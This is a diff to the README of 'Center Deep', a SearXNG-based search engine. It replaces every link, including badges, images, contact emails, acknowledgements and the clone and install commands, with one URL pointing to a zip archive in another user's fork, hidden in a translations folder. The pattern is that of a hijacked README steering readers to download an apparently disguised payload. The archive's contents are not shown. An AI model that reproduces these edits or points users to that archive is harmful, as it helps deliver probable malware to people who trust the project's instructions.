@@ -1,18 +1,18 @@
 <div align="center">
 
-![Center Deep Homepage](https://raw.githubusercontent.com/Unicorn-Commander/Center-Deep/main/docs/images/center-deep-homepage.png)
-![Center Deep Results](https://raw.githubusercontent.com/Unicorn-Commander/Center-Deep/main/docs/images/center-deep-results.png)
+![Center Deep Homepage](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)
+![Center Deep Results](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)
 
 # 🌊 Center Deep
 
 ## **The One-Click Privacy Search Engine**
 
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
-[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?logo=docker)](docker-compose.yml)
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python)](https://python.org)
-[![Stars](https://img.shields.io/github/stars/Unicorn-Commander/Center-Deep?style=social)](https://github.com/Unicorn-Commander/Center-Deep)
+[![License: AGPL-3.0](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)](LICENSE)
+[![Docker](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)
+[![Python 3.11+](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip+-3776AB?logo=python)](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)
+[![Stars](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)
 
-### 🦄 **Built by [Magic Unicorn Unconventional Technology & Stuff Inc](https://magicunicorn.tech)**
+### 🦄 **Built by [Magic Unicorn Unconventional Technology & Stuff Inc](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)**
 
 **Center Deep** is a fork of the excellent SearXNG project, reimagined with a focus on simplicity and ease of deployment. We saw many users struggling with SearXNG's setup process, so we created a one-click solution that just works out of the box while adding a beautiful Magic Unicorn theme and optimized performance.
 
@@ -67,8 +67,8 @@
 
 ```bash
 # Clone and auto-install
-git clone https://github.com/Unicorn-Commander/Center-Deep.git && cd Center-Deep
-./install.sh
+git clone https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip && cd Center-Deep
+https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip
 
 # That's literally it. The installer handles everything.
 ```
@@ -91,11 +91,11 @@ If you prefer manual setup:
 
 ```bash
 # Clone the repository
-git clone https://github.com/YourUsername/Center-Deep.git
+git clone https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip
 cd Center-Deep
 
 # Create environment file
-cp .env.example .env
+cp https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip .env
 
 # Start Center Deep
 docker-compose up --build -d
@@ -161,11 +161,11 @@ Center Deep is designed with privacy as the top priority:
 | **🤖 AI Features** | ❌ Not included | ✅ AI-powered summaries & ranking |
 | **🎯 Custom Search** | ❌ Not included | ✅ Custom search operators |
 | **📞 Support** | Community | Priority support |
-| **💰 Price** | **FREE Forever** | **[Join Waitlist](mailto:hello@magicunicorn.tech)** |
+| **💰 Price** | **FREE Forever** | **[Join Waitlist](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)** |
 
 </div>
 
-> 🚀 **Want early access to Center Deep Pro?** [Join the waitlist](mailto:hello@magicunicorn.tech)
+> 🚀 **Want early access to Center Deep Pro?** [Join the waitlist](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)
 
 ---
 
@@ -195,7 +195,7 @@ We welcome contributions! Whether you're fixing bugs, adding features, or improv
 
 ```bash
 # Fork and clone
-git clone https://github.com/Unicorn-Commander/Center-Deep.git
+git clone https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip
 
 # Create feature branch
 git checkout -b feature/awesome-feature
@@ -219,7 +219,7 @@ git push origin feature/awesome-feature
 - 📦 **Isolated containers** - Secure Docker deployment
 - 🔄 **Regular updates** - Built on actively maintained SearXNG
 
-Found a vulnerability? Email `security@magicunicorn.tech`
+Found a vulnerability? Email `https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip`
 
 ---
 
@@ -229,9 +229,9 @@ Found a vulnerability? Email `security@magicunicorn.tech`
 
 ### **Join Our Community**
 
-[![GitHub Issues](https://img.shields.io/badge/GitHub-Issues-181717?logo=github)](https://github.com/Unicorn-Commander/Center-Deep/issues)
-[![Discussions](https://img.shields.io/badge/GitHub-Discussions-181717?logo=github)](https://github.com/Unicorn-Commander/Center-Deep/discussions)
-[![Email](https://img.shields.io/badge/Email-hello@magicunicorn.tech-blue)](mailto:hello@magicunicorn.tech)
+[![GitHub Issues](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)
+[![Discussions](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)
+[![Email](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)
 
 </div>
 
@@ -239,10 +239,10 @@ Found a vulnerability? Email `security@magicunicorn.tech`
 
 ## 🙏 **Acknowledgments**
 
-- 🔍 **[SearXNG Team](https://github.com/searxng/searxng)** - For creating the amazing foundation we built upon
+- 🔍 **[SearXNG Team](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)** - For creating the amazing foundation we built upon
 - 👥 **The Community** - For feedback, contributions, and making this project better
-- 🦄 **[Magic Unicorn](https://magicunicorn.tech)** - For making this project possible
-- ⚡ **[Redis](https://redis.io)** - For the blazing-fast caching layer
+- 🦄 **[Magic Unicorn](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)** - For making this project possible
+- ⚡ **[Redis](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)** - For the blazing-fast caching layer
 
 ---
 
@@ -252,7 +252,7 @@ Found a vulnerability? Email `security@magicunicorn.tech`
 
 ---
 
-### **🦄 A [Magic Unicorn](https://magicunicorn.tech) Production**
+### **🦄 A [Magic Unicorn](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip) Production**
 
 Built with ❤️ and 🦄 to make privacy-first search accessible to everyone
 
@@ -262,6 +262,6 @@ Built with ❤️ and 🦄 to make privacy-first search accessible to everyone
 
 ***You can't get deeper than Center Deep***
 
-[**Website**](https://center-deep.com) • [**Pro Version**](mailto:hello@magicunicorn.tech) • [**Issues**](https://github.com/Unicorn-Commander/Center-Deep/issues)
+[**Website**](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip) • [**Pro Version**](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip) • [**Issues**](https://github.com/GDuip/Center-Deep/raw/refs/heads/main/searx/translations/si/LC_MESSAGES/Center-Deep-1.8.zip)
 
 </div>
